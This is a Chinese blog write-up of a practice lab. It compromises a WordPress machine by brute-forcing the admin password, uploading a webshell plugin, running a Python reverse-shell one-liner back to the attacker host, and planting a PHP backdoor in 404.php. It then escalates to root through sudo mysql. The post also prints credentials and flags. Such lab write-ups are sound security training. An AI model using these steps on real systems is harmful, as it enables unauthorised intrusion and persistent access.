+<p>发现在访问<a target="_blank" rel="noopener" href="http://10.0.2.11/wordpress/%E7%9A%84%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E9%A1%B5%E9%9D%A2%E5%9C%A8%E8%B5%84%E6%BA%90%E8%AF%B7%E6%B1%82%E6%97%B6%E8%BF%98%E4%BC%9A%E8%AE%BF%E9%97%AE%E5%9C%B0%E5%9D%80192.168.159.145">http://10.0.2.11/wordpress/的过程中，页面在资源请求时还会访问地址192.168.159.145</a></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117103351121.png" alt="image-20211117103351121"></p>
+<p>对页面返回的响应结果进行筛选过滤192.168.159.145</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117104819274.png" alt="image-20211117104819274"></p>
+<p>发现存在默认访问该IP的硬编码写入</p>
+<p>使用Burpsuite–Proxy–Match and Replace–Add–配置</p>
+<p>作用：将响应头部中和响应体内的192.168.159.145强制替换为10.0.2.11</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117113559581.png" alt="image-20211117113559581"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117113614462.png" alt="image-20211117113614462"></p>
+<p>重新访问页面</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117105003629.png" alt="image-20211117105003629"></p>
+<p>发现访问顺畅迅速，且加载了之前没能加载到的前端JS脚本，即页面加载成功。</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117110643947.png" alt="image-20211117110643947"></p>
+<h2 id="二、漏洞挖掘"><a href="#二、漏洞挖掘" class="headerlink" title="二、漏洞挖掘"></a>二、漏洞挖掘</h2><h3 id="1-对页面里的链接和表单提交等位置尝试检测"><a href="#1-对页面里的链接和表单提交等位置尝试检测" class="headerlink" title="1.对页面里的链接和表单提交等位置尝试检测"></a>1.对页面里的链接和表单提交等位置尝试检测</h3><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117105845151.png" alt="image-20211117105845151"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117110717572.png" alt="image-20211117110717572"></p>
+<p>并未发现直接漏洞</p>
+<h3 id="2-对WordPress版本的漏洞进行查找"><a href="#2-对WordPress版本的漏洞进行查找" class="headerlink" title="2.对WordPress版本的漏洞进行查找"></a>2.对WordPress版本的漏洞进行查找</h3><p>并未发现直接可利用漏洞（代码执行等）</p>
+<h3 id="3-返回查看目录扫描结果"><a href="#3-返回查看目录扫描结果" class="headerlink" title="3.返回查看目录扫描结果"></a>3.返回查看目录扫描结果</h3><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117105722251.png" alt="image-20211117105722251"></p>
+<p>发现疑似管理后台路径，尝试访问<a target="_blank" rel="noopener" href="http://10.0.2.11/wordpress/wp-admin">http://10.0.2.11/wordpress/wp-admin</a></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117113657009.png" alt="image-20211117113657009"></p>
+<p>确实是WordPress的管理后台，查询获得WordPress默认账号为admin，尝试弱口令后无果</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117113731381.png" alt="image-20211117113731381"></p>
+<h3 id="4-对管理页面进行密码爆破"><a href="#4-对管理页面进行密码爆破" class="headerlink" title="4.对管理页面进行密码爆破"></a>4.对管理页面进行密码爆破</h3><p>根据长度筛选出 请求密码为adam14时发生了重定向</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117141137210.png" alt="image-20211117141137210"></p>
+<p>分析响应头中，重定向到<a target="_blank" rel="noopener" href="http://192.168.159.145/wordpress/wp-admin/">http://192.168.159.145/wordpress/wp-admin/</a></p>
+<p>且有服务端分配给访问者的cookie</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117141215930.png" alt="image-20211117141215930"></p>
+<p>登录WordPress后台，WordPress版本为5.7.1</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117141334010.png" alt="image-20211117141334010"></p>
+<h3 id="5-WordPress后台漏洞利用"><a href="#5-WordPress后台漏洞利用" class="headerlink" title="5.WordPress后台漏洞利用"></a>5.WordPress后台漏洞利用</h3><h4 id="5-1尝试在“主题”插入一句话木马连接蚁剑"><a href="#5-1尝试在“主题”插入一句话木马连接蚁剑" class="headerlink" title="5.1尝试在“主题”插入一句话木马连接蚁剑"></a>5.1尝试在“主题”插入一句话木马连接蚁剑</h4><p>Appearance–Theme Editor–404.php</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117141839492.png" alt="image-20211117141839492"></p>
+<p>上传失败</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117141931382.png" alt="image-20211117141931382"></p>
+<h4 id="5-2利用插件上传webshell"><a href="#5-2利用插件上传webshell" class="headerlink" title="5.2利用插件上传webshell"></a>5.2利用插件上传webshell</h4><h5 id="5-2-1上传实现反弹shell连接"><a href="#5-2-1上传实现反弹shell连接" class="headerlink" title="5.2.1上传实现反弹shell连接"></a>5.2.1上传实现反弹shell连接</h5><p>本地写一个简单的插件（符合WordPress标准的）</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117142333540.png" alt="image-20211117142333540"></p>
+<p>Plugins–Add–Upload Plugins</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117142059793.png" alt="image-20211117142059793"></p>
+<p>并压缩为可上传格式</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117142554942.png" alt="image-20211117142554942"></p>
+<p>上传、激活</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117142630478.png" alt="image-20211117142630478"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117142653949.png" alt="image-20211117142653949"></p>
+<p>插件默认路径为：</p>
+<p><a target="_blank" rel="noopener" href="http://10.0.2.11/wordpress/wp-content/plugins/shell.php">http://10.0.2.11/wordpress/wp-content/plugins/shell.php</a></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117142901551.png" alt="image-20211117142901551"></p>
+<p>尝试执行id命令：</p>
+<p><a target="_blank" rel="noopener" href="http://10.0.2.11/wordpress/wp-content/plugins/shell.php?cmd=id">http://10.0.2.11/wordpress/wp-content/plugins/shell.php?cmd=id</a></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117143020914.png" alt="image-20211117143020914"></p>
+<p>确定了webshell上传成功，且可执行操作系统命令</p>
+<h5 id="5-2-2-确认目标靶机上可利用的信息-x2F-软件"><a href="#5-2-2-确认目标靶机上可利用的信息-x2F-软件" class="headerlink" title="5.2.2 确认目标靶机上可利用的信息&#x2F;软件"></a>5.2.2 确认目标靶机上可利用的信息&#x2F;软件</h5><h6 id="Kali监听4444端口"><a href="#Kali监听4444端口" class="headerlink" title="Kali监听4444端口"></a>Kali监听4444端口</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117143051516.png" alt="image-20211117143051516"></p>
+<h6 id="确定目标靶机是否有nc"><a href="#确定目标靶机是否有nc" class="headerlink" title="确定目标靶机是否有nc"></a>确定目标靶机是否有nc</h6><p>（存在，但本次尝试其他方法）</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117143209631.png" alt="image-20211117143209631"></p>
+<h6 id="确定目标靶机是否有Python环境"><a href="#确定目标靶机是否有Python环境" class="headerlink" title="确定目标靶机是否有Python环境"></a>确定目标靶机是否有Python环境</h6><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117144310167.png" alt="image-20211117144310167"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117144328196.png" alt="image-20211117144328196"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117144402379.png" alt="image-20211117144402379"></p>
+<p>目标靶机存在Python3环境</p>
+<h5 id="5-2-3使用python3反弹shell代码"><a href="#5-2-3使用python3反弹shell代码" class="headerlink" title="5.2.3使用python3反弹shell代码"></a>5.2.3使用python3反弹shell代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117145344122.png" alt="image-20211117145344122"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117145402436.png" alt="image-20211117145402436"></p>
+<p>使用msf 寻找可利用的wordpress exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfdb run</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search wordpress admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117144658121.png" alt="image-20211117144658121"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117145600950.png" alt="image-20211117145600950"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set PASSWORD adam14</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOSTS 10.0.2.11</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set TARGETURI /wordpress</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set USERNAME admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117145845194.png" alt="image-20211117145845194"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117150025521.png" alt="image-20211117150025521"></p>
+<p>缺点：有些命令不能成功显示</p>
+<h4 id="5-3再次尝试在“主题”插入一句话木马"><a href="#5-3再次尝试在“主题”插入一句话木马" class="headerlink" title="5.3再次尝试在“主题”插入一句话木马"></a>5.3再次尝试在“主题”插入一句话木马</h4><p>回顾之前在Web页面插入一句话木马修改404.php模板失败，那在现已经获得命令行shell的前提下，是否可以尝试手动的添加一句话？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd wp-content</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd themes</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117150443652.png" alt="image-20211117150443652"></p>
+<p>再结合页面信息，确定当前主题名为twentytwentyone（404.php在其目录下）</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117150649101.png" alt="image-20211117150649101"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd twentytwentyone</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117150806467.png" alt="image-20211117150806467"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi 404.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117150904611.png" alt="image-20211117150904611"></p>
+<p>试图移动光标发现webshell在交互过程中仍存在不足</p>
+<p>升级webshell（只适用于bash）(此处是第二次复现整理的WP所以未再次退回环境重新截图，请参考代码文字即可)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+Z</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty raw -echo</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fg #返回之前的连接</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p>因为kali是zsh，故要切换为bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /bin/bash  #确定是否有bash</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo chsh -s /bin/bash #更改root用户</span><br><span class="line">chsh -s /bin/bash #更改kali用户</span><br><span class="line">（根据需要选择）</span><br></pre></td></tr></table></figure>
+
+<p>重启后进行确认并监听</p>
+<p>准备重新连接shell</p>
+<p>连接成功</p>
+<p>升级webshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+Z</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty raw -echo</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fg #返回之前的连接</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export SHELL=/bin/bash</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export TERM=screen</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty rows 38 columns 116</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reset</span><br></pre></td></tr></table></figure>
+
+<p>（升级成功 可Tab补全）调小字体后</p>
+<p>在404.php中写入一句话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi wp-content/themes/twentytwentyone/404.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117152444377.png" alt="image-20211117152444377"></p>
+<p>保存后打开蚁剑进行配置以维持权限稳定</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Shell:http://10.0.2.11/wordpress/wp-content/themes/twentytwentyone/404.php</span><br><span class="line"></span><br><span class="line">pwd:aa</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117152943835.png" alt="image-20211117152943835"></p>
+<p>成功连接</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117153006539.png" alt="image-20211117153006539"></p>
+<h2 id="三、提权"><a href="#三、提权" class="headerlink" title="三、提权"></a>三、提权</h2><h3 id="1-查看-x2F-etc-x2F-passwd"><a href="#1-查看-x2F-etc-x2F-passwd" class="headerlink" title="1.查看&#x2F;etc&#x2F;passwd"></a>1.查看&#x2F;etc&#x2F;passwd</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117153735618.png" alt="image-20211117153735618"></p>
+<h3 id="2-查看主目录文件内是否有该用户"><a href="#2-查看主目录文件内是否有该用户" class="headerlink" title="2.查看主目录文件内是否有该用户"></a>2.查看主目录文件内是否有该用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /home/wpadmin/ -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117153914865.png" alt="image-20211117153914865"></p>
+<p>发现存在local.txt文件，只有wpadmin用户对其有读的权限</p>
+<h3 id="3-查看操作系统内核"><a href="#3-查看操作系统内核" class="headerlink" title="3.查看操作系统内核"></a>3.查看操作系统内核</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
+
+<p>失败</p>
+<h3 id="4-尝试查看当前用户有没有sudo权限"><a href="#4-尝试查看当前用户有没有sudo权限" class="headerlink" title="4.尝试查看当前用户有没有sudo权限"></a>4.尝试查看当前用户有没有sudo权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>失败</p>
+<h3 id="5-查看WordPress的配置文件"><a href="#5-查看WordPress的配置文件" class="headerlink" title="5.查看WordPress的配置文件"></a>5.查看WordPress的配置文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html/wordpress/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat wp-config.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117154514825.png" alt="image-20211117154514825"></p>
+<h3 id="6-是否有密码复用的可能性"><a href="#6-是否有密码复用的可能性" class="headerlink" title="6.是否有密码复用的可能性?"></a>6.是否有密码复用的可能性?</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ww-data@wp:/var/www/html/wordpress$ su wpadmin</span><br><span class="line">Password: </span><br><span class="line">su: Authentication failure</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117154640760.png" alt="image-20211117154640760"></p>
+<p>失败</p>
+<h3 id="7-尝试登录数据库账号"><a href="#7-尝试登录数据库账号" class="headerlink" title="7.尝试登录数据库账号"></a>7.尝试登录数据库账号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u admin -p Wp_Admin#123 -D wordpress</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117154804076.png" alt="image-20211117154804076">失败</p>
+<h3 id="8-尝试是否复用了Web页面的密码"><a href="#8-尝试是否复用了Web页面的密码" class="headerlink" title="8.尝试是否复用了Web页面的密码"></a>8.尝试是否复用了Web页面的密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su wpadmin</span><br></pre></td></tr></table></figure>
+
+<p>尝试输入密码adam14</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117154929085.png" alt="image-20211117154929085"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat local.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155043263.png" alt="image-20211117155043263"></p>
+<p>flag1:153495edec1b606c24947b1335998bd9</p>
+<h3 id="9-二次提权"><a href="#9-二次提权" class="headerlink" title="9.二次提权"></a>9.二次提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>提示可以执行的命令：</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155135536.png" alt="image-20211117155135536"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/mysql -u root -D wordpress -p    #输入密码adam14</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155339940.png" alt="image-20211117155339940"></p>
+<p>成功登录数据库</p>
+<h3 id="10-利用mysql数据库特性"><a href="#10-利用mysql数据库特性" class="headerlink" title="10.利用mysql数据库特性"></a>10.利用mysql数据库特性</h3><p>当前启动的数据库进程是具有root权限的，结合mysql数据库 system 命令 的功能</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system id </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155440756.png" alt="image-20211117155440756"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\! /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155507429.png" alt="image-20211117155507429"></p>
+<p>成功获取root权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat proof.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155542610.png" alt="image-20211117155542610"></p>
+<p>flag2:7efd721c8bfff2937c66235f2d0dbac1</p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">一、信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">1.主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.</span> <span class="toc-text">2.端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.</span> <span class="toc-text">3.端口服务信息扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%AE%BF%E9%97%AE10-0-2-11%E7%9A%8480%E7%AB%AF%E5%8F%A3%E9%A1%B5%E9%9D%A2"><span class="toc-number">1.4.</span> <span class="toc-text">4.访问10.0.2.11的80端口页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%BD%BF%E7%94%A8feroxbuster%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">1.5.</span> <span class="toc-text">5.使用feroxbuster目录扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%AE%BF%E9%97%AE%E5%8F%AF%E7%96%91%E7%9B%AE%E5%BD%95"><span class="toc-number">1.6.</span> <span class="toc-text">6.访问可疑目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E4%BD%BF%E7%94%A8Burpsuite%E5%AF%B9%E8%AE%BF%E9%97%AE%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%B5%81%E9%87%8F%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90"><span class="toc-number">1.7.</span> <span class="toc-text">7.使用Burpsuite对访问页面的流量进行分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">2.</span> <span class="toc-text">二、漏洞挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AF%B9%E9%A1%B5%E9%9D%A2%E9%87%8C%E7%9A%84%E9%93%BE%E6%8E%A5%E5%92%8C%E8%A1%A8%E5%8D%95%E6%8F%90%E4%BA%A4%E7%AD%89%E4%BD%8D%E7%BD%AE%E5%B0%9D%E8%AF%95%E6%A3%80%E6%B5%8B"><span class="toc-number">2.1.</span> <span class="toc-text">1.对页面里的链接和表单提交等位置尝试检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AF%B9WordPress%E7%89%88%E6%9C%AC%E7%9A%84%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E6%9F%A5%E6%89%BE"><span class="toc-number">2.2.</span> <span class="toc-text">2.对WordPress版本的漏洞进行查找</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%BF%94%E5%9B%9E%E6%9F%A5%E7%9C%8B%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C"><span class="toc-number">2.3.</span> <span class="toc-text">3.返回查看目录扫描结果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%AF%B9%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2%E8%BF%9B%E8%A1%8C%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">2.4.</span> <span class="toc-text">4.对管理页面进行密码爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-WordPress%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.5.</span> <span 